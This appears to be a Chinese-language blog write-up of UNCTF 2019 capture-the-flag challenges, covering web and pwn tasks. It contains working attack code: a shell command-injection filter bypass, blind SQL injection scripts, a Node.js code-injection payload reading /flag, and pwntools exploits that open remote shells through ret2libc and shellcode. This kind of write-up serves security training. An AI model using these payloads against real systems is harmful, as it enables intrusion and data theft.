<!DOCTYPE html>
<html lang="zh-CN">





<head><meta name="generator" content="Hexo 3.9.0">
    <meta charset="UTF-8">
    <link rel="apple-touch-icon" sizes="76x76" href="/img/apple-touch-icon.png">
    <link rel="icon" type="image/png" href="/img/favicon.png">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, shrink-to-fit=no">
    <meta http-equiv="x-ua-compatible" content="ie=edge">
    <meta name="description" content="FzWjScJ">
    <meta name="author" content="FzWjScJ">
    <meta name="keywords" content="“在安全上越变越菜的萌旧”">
    <title>UNCTF——我真的肝不动了。。。 ~ 一个菜鸡的博客</title>
    <link rel="stylesheet" href="/lib/font-awesome/css/all.min.css?v=5.7.2">
    <link rel="stylesheet" href="/lib/mdbootstrap/css/bootstrap.min.css?v=4.3.1">
    <link rel="stylesheet" href="/lib/mdbootstrap/css/mdb.min.css?v=4.8.7">
    <link rel="stylesheet" href="/lib/github-markdown/github-markdown.min.css">
    <link rel="stylesheet" href="/lib/nprogress/nprogress.css?v=0.2.0">
    <link rel="stylesheet" href="//at.alicdn.com/t/font_1067060_qzomjdt8bmp.css">
    
        <link rel="stylesheet" href="/lib/prettify/tomorrow.min.css">
    
    <link rel="stylesheet" href="/css/main.css">

    
    <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js">
</script>

</head>


<body>
<header style="height: 70vh;">
    <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
<div class="container">
    <a class="navbar-brand" href="/">&nbsp;<strong>一个菜鸡的博客</strong>&nbsp;</a>

    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse" data-target="#navbarSupportedContent"
        aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
        <div class="animated-icon"><span></span><span></span><span></span></div>
    </button>

    <!-- Collapsible content -->
    <div class="collapse navbar-collapse" id="navbarSupportedContent">
        <ul class="navbar-nav ml-auto text-center">
            
            <li class="nav-item">
                <a class="nav-link" href="/">Home</a>
            </li>
            
            <li class="nav-item">
                <a class="nav-link" href="/archives/">Archives</a>
            </li>
            
            <li class="nav-item">
                <a class="nav-link" href="/categories/">Categories</a>
            </li>
            
            <li class="nav-item">
                <a class="nav-link" href="/tags/">Tags</a>
            </li>
            
            <li class="nav-item">
                <a class="nav-link" href="/about/">About</a>
            </li>
            
            <li class="nav-item">
                <a class="nav-link" href="/friend">Friend</a>
            </li>
            
        </ul>
    </div>
</div>


</nav>
    <div class="view intro-2"
         style="background: url('/img/post.jpg')no-repeat center center;background-size: cover;">
        <div class="full-bg-img">
            <div class="mask rgba-black-light flex-center">
                <div class="container text-center white-text wow fadeInUp">
                    <span class="h2" id="subtitle">
                        
                    </span>
                    
                        <br>
                        <p>星期三, 十月 30日 2019, 8:43 晚上</p>
                    
                </div>
            </div>
        </div>
    </div>
</header>

<main>
    
        

<div class="container-fluid">
    <div class="row">
        <div class="d-none d-lg-block col-lg-2"></div>
            <div class="col-lg-8 nopadding-md">
                <div class="py-5 z-depth-3 board">
                    <div class="post-content mx-auto">
                        <div class="markdown-body">
                            <p>​        从上周三开始就一直在肝。。。然后就是一周过去了，之间还曾经到了第一（然后第二天直接掉到第六，我太难了），果然这就是菜吧。</p>
<p><img src="https://i.loli.net/2019/10/30/grdJVjU5mHiqyDY.jpg" alt></p>
<p>(PS:才发现自己好多图都死了。。。会慢慢处理</p>
<h1 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h1><hr>
<h2 id="bypass"><a href="#bypass" class="headerlink" title="bypass"></a>bypass</h2><h4 id="Description"><a href="#Description" class="headerlink" title="Description"></a>Description</h4><p>​        unctf_bypass</p>
<h4 id="Analyze"><a href="#Analyze" class="headerlink" title="Analyze"></a>Analyze</h4><p>​        进入网址读源码</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">    $a = $_GET[<span class="string">'a'</span>];</span><br><span class="line">    $b = $_GET[<span class="string">'b'</span>];</span><br><span class="line"> <span class="comment">// try bypass it</span></span><br><span class="line">    <span class="keyword">if</span> (preg_match(<span class="string">"/\'|\"|,|;|\`|\\|\*|\n|\t|\xA0|\r|\&#123;|\&#125;|\(|\)|&lt;|\&amp;[^\d]|@|\||tail|bin|less|more|string|nl|pwd|cat|sh|flag|find|ls|grep|echo|w/is"</span>, $a))</span><br><span class="line">        $a = <span class="string">""</span>;</span><br><span class="line">        $a =<span class="string">'"'</span> . $a . <span class="string">'"'</span>;</span><br><span class="line">    <span class="keyword">if</span> (preg_match(<span class="string">"/\'|\"|;|,|\`|\*|\\|\n|\t|\r|\xA0|\&#123;|\&#125;|\(|\)|&lt;|\&amp;[^\d]|@|\||tail|bin|less|more|string|nl|pwd|cat|sh|flag|find|ls|grep|echo|w/is"</span>, $b))</span><br><span class="line">        $b = <span class="string">""</span>;</span><br><span class="line">        $b = <span class="string">'"'</span> . $b . <span class="string">'"'</span>;</span><br><span class="line">     $cmd = <span class="string">"file $a $b"</span>;</span><br><span class="line">      str_replace(<span class="string">" "</span>,<span class="string">""</span>,<span class="string">"$cmd"</span>); </span><br><span class="line">     system($cmd);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>​        然后大概意思就是a,b读取到正则那一大堆的东西中一个时，将a输入到“和”之间，b同理，之后再执行file $a $b的命令。这里想到了闭合标签绕过再换行执行命令，所以构造payload：<code>?a=\&amp;b= %0afi\nd /var/ fl\ag%0a</code>，其实上面判断的只有<code>file &quot;\&quot;&quot; &quot;</code>闭合file，system真正执行的时<code>fi\nd /var/ fl\ag</code>的命令，然后在linux中，<code>&#39;\&#39;</code>分割开的命令仍然可以运行，所以页面返回了<img src="https://i.loli.net/2019/10/30/xDIuw27jEg3eV6S.jpg" alt></p>
<p>​        一大堆地址，但是其中发现了<code>/var/www/html/.F1jh_/h3R3_1S_your_F1A9.txt</code>这一个地址，打开后得到flag</p>
<h4 id="Solve"><a href="#Solve" class="headerlink" title="Solve"></a>Solve</h4><p><code>http://101.71.29.5:10054/.F1jh_/h3R3_1S_your_F1A9.txt</code></p>
<h4 id="flag"><a href="#flag" class="headerlink" title="flag"></a>flag</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">unctf&#123;86dfe85d7c5842c5c04adae104193ee1&#125;</span><br></pre></td></tr></table></figure>

<hr>
<h2 id="NSB-Reset-Password"><a href="#NSB-Reset-Password" class="headerlink" title="NSB Reset Password"></a>NSB Reset Password</h2><h4 id="Description-1"><a href="#Description-1" class="headerlink" title="Description"></a>Description</h4><p>​        我们遇到什么glzjin，都不要怕，微笑着面对他，消除glzjin的最好办法就是化身glzjin，坚持，才是胜利，加油，奥力给！！！！！！</p>
<h4 id="Analyze-1"><a href="#Analyze-1" class="headerlink" title="Analyze"></a>Analyze</h4><p>​        赵总征婚二度，这题。。真的想了好久一段时间，先是爆破了好久2333。然后就开始各种骚操作乱做。最后莫名奇妙就出来了一次，复现又盘了好久。。。总之，这题就只有一个session，他的重置密码过程是在一条线上的，所以当你已经通过自己邮箱重置自己密码时的最后写密码的时候，再用bp发一个admin重置密码的请求包，你重置的”自己”的密码也就变成了重置admin的密码，登录即可得到flag。</p>
<h4 id="Solve-1"><a href="#Solve-1" class="headerlink" title="Solve"></a>Solve</h4><p>如上所述</p>
<p><img src="https://i.loli.net/2019/10/30/VMgl1kJZjqp8sQS.jpg" alt></p>
<p><img src="https://i.loli.net/2019/10/30/e7MtcnfgEs8bukm.jpg" alt></p>
<h4 id="flag-1"><a href="#flag-1" class="headerlink" title="flag"></a>flag</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;175f3098f80735ddfdfbd4588f6b1082&#125;</span><br></pre></td></tr></table></figure>

<hr>
<h2 id="easy-admin"><a href="#easy-admin" class="headerlink" title="easy_admin"></a>easy_admin</h2><h4 id="Description-2"><a href="#Description-2" class="headerlink" title="Description"></a>Description</h4><p>​        easy_admin</p>
<h4 id="Analyze-2"><a href="#Analyze-2" class="headerlink" title="Analyze"></a>Analyze</h4><p>​        开始以为又是个二次注入</p>
<p><img src="https://i.loli.net/2019/10/30/obKZBnp8kTqVUhG.jpg" alt></p>
<p>​        试了一下后发现。。。并不对，但是当你在forgetpassword里输入<code>admin &#39; or &#39;1 = 1&#39;</code>时，页面会返回一个<code>hacker</code>，所以猜测时盲注，使用之前的脚本注入，得到前半段flag<code>flag{never_too</code>,然后这也是admin的密码，登录上去后看见</p>
<p><img src="https://i.loli.net/2019/10/30/s7zZthURAk2ou9O.jpg" alt></p>
<p>​        易得admin都是本地登录的，使用在头加上<code>Referer:127.0.0.1</code>，使其本地登录，得到后半段flag<code>_late_to_x}</code></p>
<h4 id="Solve-2"><a href="#Solve-2" class="headerlink" title="Solve"></a>Solve</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># blind SQL</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">'http://101.71.29.5:10045/index.php?file=forget'</span></span><br><span class="line"></span><br><span class="line">flag = <span class="string">''</span></span><br><span class="line">proxies=&#123;</span><br><span class="line">    <span class="string">"http"</span>:<span class="string">"http://127.0.0.1:8080/"</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">40</span>):</span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> range(ord(<span class="string">'0'</span>),ord(<span class="string">'&#125;'</span>)):</span><br><span class="line">        payload = <span class="string">"-1'or ascii(substr((password),%d,1))=%d#"</span>%(i,x)</span><br><span class="line">        data = &#123;<span class="string">'username'</span>:payload&#125;</span><br><span class="line">        res = requests.post(url,data=data,proxies=proxies)</span><br><span class="line">        <span class="comment"># print(res.content)</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">'no'</span><span class="keyword">in</span> res.text:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            flag += chr(x)</span><br><span class="line">            print(flag)</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure>

<p><img src="https://i.loli.net/2019/10/30/VEuB28kiFG7AcIH.jpg" alt></p>
<h4 id="flag-2"><a href="#flag-2" class="headerlink" title="flag"></a>flag</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;never_too_late_to_x&#125;</span><br></pre></td></tr></table></figure>

<hr>
<h2 id="帮赵总征婚"><a href="#帮赵总征婚" class="headerlink" title="帮赵总征婚"></a>帮赵总征婚</h2><h4 id="Description-3"><a href="#Description-3" class="headerlink" title="Description"></a>Description</h4><p>​        华北最大安全集团NSB老总glzjin最近终于找到了girlfriend，但他现在想要six wife了，你能帮他登录一下这个NSB征婚网站吗？</p>
<h4 id="Analyze-3"><a href="#Analyze-3" class="headerlink" title="Analyze"></a>Analyze</h4><p>​        这题一打开F12源码中就有个<code>&lt;!-- I like rockyou! --&gt;</code>的注释，然后知道kali中有个弱密码字典就是rockyou，所以爆破,然后。。。就言简意赅的bp快乐爆破时间</p>
<h4 id="Solve-3"><a href="#Solve-3" class="headerlink" title="Solve"></a>Solve</h4><p>​        <img src="https://i.loli.net/2019/10/30/KEN8jX7izOZAcfv.jpg" alt></p>
<h4 id="flag-3"><a href="#flag-3" class="headerlink" title="flag"></a>flag</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;57fc636a42f46c7658110a631256f5cb&#125;</span><br></pre></td></tr></table></figure>

<hr>
<h2 id="简单的备忘录"><a href="#简单的备忘录" class="headerlink" title="简单的备忘录"></a>简单的备忘录</h2><h4 id="Description-4"><a href="#Description-4" class="headerlink" title="Description"></a>Description</h4><p>Do not forget.</p>
<h4 id="Analyze-4"><a href="#Analyze-4" class="headerlink" title="Analyze"></a>Analyze</h4><p>​        这题。。。真实运气，终端补全写得太好了，于是把命令试了一遍。。。就解出来了（PS:后面好像就不行了，emmm算是非预期了吧233</p>
<h4 id="Solve-4"><a href="#Solve-4" class="headerlink" title="Solve"></a>Solve</h4><p><img src="https://i.loli.net/2019/10/30/M9pnXdeQysD6Lui.jpg" alt></p>
<h4 id="flag-4"><a href="#flag-4" class="headerlink" title="flag"></a>flag</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;3ad4aaedf408c147d5f747f7ce76d2b4&#125;</span><br></pre></td></tr></table></figure>

<hr>
<h2 id="checkin"><a href="#checkin" class="headerlink" title="checkin"></a>checkin</h2><h4 id="Description-5"><a href="#Description-5" class="headerlink" title="Description"></a>Description</h4><p>​        checkin</p>
<h4 id="Analyze-5"><a href="#Analyze-5" class="headerlink" title="Analyze"></a>Analyze</h4><p>​        怀疑人生的签到题。。。但是聊天室没有禁语屏蔽。。所以看到有大佬说时nodejs注入，然后便去看资料现学2333（不然可能现在都没出来）然后读js发现了</p>
<p><img src="https://i.loli.net/2019/10/30/OYMPdq3C8IFNE7p.jpg" alt></p>
<p>​        于是猜测是利用<code>/calc</code>的这个case,于是利用主进程的’fs’的读写功能进行命令注入，构建payload<code>/calc process.mainModule.require(&#39;fs&#39;).readFileSync(&#39;/flag&#39;,&#39;utf-8&#39;);</code> 执行后得到flag</p>
<h4 id="Solve-5"><a href="#Solve-5" class="headerlink" title="Solve"></a>Solve</h4><p>​        <img src="https://i.loli.net/2019/10/30/rvP5IoehCmXlGbz.jpg" alt></p>
<h4 id="flag-5"><a href="#flag-5" class="headerlink" title="flag"></a>flag</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;0e4d1980ef6f8a81428f83e8e1c6e22b&#125;</span><br></pre></td></tr></table></figure>

<hr>
<h2 id="twice-injection"><a href="#twice-injection" class="headerlink" title="twice injection"></a>twice injection</h2><h4 id="Description-6"><a href="#Description-6" class="headerlink" title="Description"></a>Description</h4><p>​        已经忘记了题名=。=</p>
<h4 id="Analyze-6"><a href="#Analyze-6" class="headerlink" title="Analyze"></a>Analyze</h4><p>​        开始一个sqli的题目，以为只要登录admin登录上去就可以万事大吉，然后。。。就没有然后了，上去后并没有任何作用。。然后换了姿势开始盲注。爆破一段时间后得到flag。</p>
<h4 id="Solve-6"><a href="#Solve-6" class="headerlink" title="Solve"></a>Solve</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url1 = <span class="string">"http://101.71.29.5:10002/login_create.php"</span> <span class="comment"># 注册</span></span><br><span class="line"><span class="comment"># username password re_password submit=Register</span></span><br><span class="line">url2 = <span class="string">"http://101.71.29.5:10002/login.php"</span> <span class="comment"># 登录</span></span><br><span class="line"><span class="comment"># login_user login_password mysubmit=Login</span></span><br><span class="line">url3 = <span class="string">"http://101.71.29.5:10002/pass_change.php"</span> <span class="comment"># 密码重置</span></span><br><span class="line"><span class="comment"># current_password password re_password submit=Reset</span></span><br><span class="line">sess = requests.session()</span><br><span class="line">num = <span class="number">1</span></span><br><span class="line">content = <span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">100</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">32</span>,<span class="number">127</span>):</span><br><span class="line">        res1 = sess.post(url=url1,data=&#123;<span class="string">"username"</span>:<span class="string">"a' &amp;&amp; ascii(substr((select b.1 from (select 1 union select* from fl4g)b limit 1,1),%d,1))=%d#"</span> % (i,j)</span><br><span class="line">    ,<span class="string">"password"</span>:<span class="string">"a"</span>,<span class="string">"re_password"</span>:<span class="string">"a"</span>,<span class="string">"submit"</span>:<span class="string">"Register"</span>&#125;)</span><br><span class="line">        res2 = sess.post(url=url2,data=&#123;<span class="string">"login_user"</span>:<span class="string">"a' &amp;&amp; ascii(substr((select b.1 from (select 1 union select* from fl4g)b limit 1,1),%d,1))=%d#"</span> % (i,j)</span><br><span class="line">    ,<span class="string">"login_password"</span>:<span class="string">"a"</span>,<span class="string">"mysubmit"</span>:<span class="string">"Login"</span>&#125;)</span><br><span class="line">        res3 = sess.post(url=url3,data=&#123;<span class="string">"current_password"</span>:<span class="string">"%d"</span> % num,<span class="string">"password"</span>:<span class="string">"%d"</span> % num,<span class="string">"re_password"</span>:<span class="string">"%d"</span> % num,<span class="string">"submit"</span>:<span class="string">"Reset"</span>&#125;)</span><br><span class="line">        <span class="keyword">if</span> res3.text.find(<span class="string">"successfully"</span>) != <span class="number">-1</span>:</span><br><span class="line">            content = content + chr(j)</span><br><span class="line">            print(content)</span><br><span class="line">        num = num + <span class="number">1</span></span><br></pre></td></tr></table></figure>

<h4 id="flag-6"><a href="#flag-6" class="headerlink" title="flag"></a>flag</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">UNCTF&#123;585ae8df50433972bb6ebd76e3ebd9f4&#125;</span><br></pre></td></tr></table></figure>

<hr>
<hr>
<h1 id="PWN"><a href="#PWN" class="headerlink" title="PWN"></a>PWN</h1><hr>
<h2 id="babyrop"><a href="#babyrop" class="headerlink" title="babyrop"></a>babyrop</h2><h4 id="Description-7"><a href="#Description-7" class="headerlink" title="Description"></a>Description</h4><p>​        babyrop</p>
<h4 id="Analyze-7"><a href="#Analyze-7" class="headerlink" title="Analyze"></a>Analyze</h4><p>​        巨婴题，checksec后发现是</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Arch:     i386-32-little</span><br><span class="line">RELRO:    Full RELRO</span><br><span class="line">Stack:    No canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      No PIE (0x8048000)</span><br></pre></td></tr></table></figure>

<p>​        于是。。。。wiki在线脚本，首先IDA分析程序，并没有System函数，所以猜测ret2libc，第一个绕过</p>
<p><img src="https://i.loli.net/2019/10/30/gPZkcMCbSev8dJw.jpg" alt></p>
<p>​        使v2为’ffff’，所以buf为<code>&#39;a&#39;*0x30+4*&#39;f&#39;</code>,然后继续进入函数</p>
<p><img src="https://i.loli.net/2019/10/30/QvjMcAxgp5n34PU.jpg" alt></p>
<p>​        发现对result的地址有限制，使用gadget绕过，最后是脚本一把梭。</p>
<h4 id="Solve-7"><a href="#Solve-7" class="headerlink" title="Solve"></a>Solve</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> LibcSearcher</span><br><span class="line">local = <span class="number">0</span></span><br><span class="line">attach = <span class="number">0</span></span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">    p = process(<span class="string">"./1910255db2c8f9717e5"</span>)</span><br><span class="line">    context.log_level=<span class="string">'debug'</span></span><br><span class="line">    <span class="keyword">if</span> attach == <span class="number">1</span>:</span><br><span class="line">        gdb.attach(p,<span class="string">'b *0x0804854B\nc'</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = remote(<span class="string">"101.71.29.5"</span>,<span class="number">10041</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">'Hello CTFer!'</span>)</span><br><span class="line">p.sendline(<span class="string">'A'</span>*<span class="number">0x20</span>+<span class="string">'f'</span>*<span class="number">4</span>)</span><br><span class="line">elf = ELF(<span class="string">'./1910255db2c8f9717e5'</span>)</span><br><span class="line">puts_plt = elf.plt[<span class="string">'puts'</span>]</span><br><span class="line">lsmg = elf.got[<span class="string">'__libc_start_main'</span>]</span><br><span class="line">main = <span class="number">0x0804853D</span></span><br><span class="line">trush = <span class="number">0x0804839e</span></span><br><span class="line">payload = <span class="string">'A'</span>*(<span class="number">0x10</span>+<span class="number">4</span>)+p32(trush)+p32(puts_plt)+p32(main)+p32(lsmg)</span><br><span class="line">p.recvuntil(<span class="string">'?\n'</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">a = p.recv(<span class="number">4</span>)</span><br><span class="line">__libc_start_main = u32(a)</span><br><span class="line">libc = LibcSearcher.LibcSearcher(<span class="string">'__libc_start_main'</span>,__libc_start_main)</span><br><span class="line">libcbase = __libc_start_main - libc.dump(<span class="string">'__libc_start_main'</span>)</span><br><span class="line">system_addr = libcbase+libc.dump(<span class="string">'system'</span>)</span><br><span class="line">binsh_addr = libcbase + libc.dump(<span class="string">'str_bin_sh'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'?\n'</span>)</span><br><span class="line">payload = <span class="string">'A'</span>*(<span class="number">0x10</span>+<span class="number">4</span>)+p32(trush)+p32(system_addr)+p32(<span class="number">0xdeadbeef</span>)+p32(binsh_addr)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<h4 id="flag-7"><a href="#flag-7" class="headerlink" title="flag"></a>flag</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">UNCTF&#123;7ef293810e29039f061982e72fd10bfb&#125;</span><br></pre></td></tr></table></figure>

<hr>
<h2 id="EasyShellcode"><a href="#EasyShellcode" class="headerlink" title="EasyShellcode"></a>EasyShellcode</h2><h4 id="Description-8"><a href="#Description-8" class="headerlink" title="Description"></a>Description</h4><p>​          unctf_EasyShellcode </p>
<h4 id="Analyze-8"><a href="#Analyze-8" class="headerlink" title="Analyze"></a>Analyze</h4><p>​        打开IDA分析<img src="https://i.loli.net/2019/10/30/hLVlDuEBMxtzWqH.jpg" alt></p>
<p>​        可以看出最后的shellcode是在<code>a-zA-Z0-9</code>的范围内，然后搜到了V爷爷（veritas501）的github内有转换的脚本，然后就直接用了233（ps：我好菜啊）</p>
<h4 id="Solve-8"><a href="#Solve-8" class="headerlink" title="Solve"></a>Solve</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> ae64</span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">'101.71.29.5'</span>,<span class="number">10080</span>)</span><br><span class="line">p.recvuntil(<span class="string">'o say?'</span>)</span><br><span class="line">sc = asm(shellcraft.sh())</span><br><span class="line">obj = ae64.AE64()</span><br><span class="line">sc = obj.encode(sc)</span><br><span class="line"><span class="comment">#WTYH39Yj0TYfi9XVWAXfi94WWAYjZTYfi9TVWAZjdTYfi9BgWZjWTYfi9WU0T8A0t8B0t8F0t8G0t8H0T8LRAPZ0T8MZ0t8Q0t8R0T8S0t8U0t8V0t8W0t8X0t8YjmTYfi9wFRAPZ0T8AZRAPZ0t8DZRAPZ0t8EZ0t8GRAPZ0T8HZ0T8KRAPZ0T8LZRAPZ0T8NZ0t8P0t8R0t8SjhHpzbinzzzsPHAghriTTI4qTTTT1vVj8nHTfVHAf1RjnXZP</span></span><br><span class="line">p.sendline(sc)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<h4 id="flag-8"><a href="#flag-8" class="headerlink" title="flag"></a>flag</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">UNCTF&#123;x64_A5c11_shE11c0dE_i5_50_Ea5y&#125;</span><br></pre></td></tr></table></figure>

<hr>
<h2 id="Soso-easy-pwn"><a href="#Soso-easy-pwn" class="headerlink" title="Soso_easy_pwn"></a>Soso_easy_pwn</h2><h4 id="Description-9"><a href="#Description-9" class="headerlink" title="Description"></a>Description</h4><p>​        Just_case.答案提交flag{}括号内的值。如果靶机不能正常访问，请将端口号改为10009 </p>
<h4 id="Analyze-9"><a href="#Analyze-9" class="headerlink" title="Analyze"></a>Analyze</h4><p>​        这题一开始checksec进去就看见</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Arch:     i386-32-little</span><br><span class="line">RELRO:    Partial RELRO</span><br><span class="line">Stack:    Canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      PIE enabled</span><br></pre></td></tr></table></figure>

<p>​        emmm差点就没做下去，然后丢IDA里，然后就看见了PIE的特点以及可以利用的一个函数</p>
<p><img src="https://i.loli.net/2019/10/30/x7IqBCEwvYAVD98.jpg" alt></p>
<p>​        然后看到main函数里有给前面的地址</p>
<p><img src="https://i.loli.net/2019/10/30/yLqXYmEVD1WtkdN.jpg" alt></p>
<p>​        所以每次连接都会有前四位地址的爆出</p>
<p>​        所以最后我们可以溢出新建一个case来得到shell</p>
<h4 id="Solve-9"><a href="#Solve-9" class="headerlink" title="Solve"></a>Solve</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/env python</span><br><span class="line"># coding=utf-8</span><br><span class="line">from pwn import *</span><br><span class="line">import re</span><br><span class="line"></span><br><span class="line">p = remote(&apos;101.71.29.5&apos;,10000)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">a = int(re.findall(&quot;\d+&quot;,p.recvline())[0])</span><br><span class="line">p.recvline()</span><br><span class="line">b = 0x9CD</span><br><span class="line">addr = (a&lt;&lt;16)+b+(0&lt;&lt;12)</span><br><span class="line">p.send(&apos;a&apos;*12+p32(addr))</span><br><span class="line">p.readuntil(&apos;byebye):&apos;)</span><br><span class="line">p.sendline(&apos;3&apos;)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<h4 id="flag-9"><a href="#flag-9" class="headerlink" title="flag"></a>flag</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">UNCTF&#123;S0_so_E4zy_Pwn&#125;</span><br></pre></td></tr></table></figure>

<hr>
<hr>
<h1 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h1><hr>
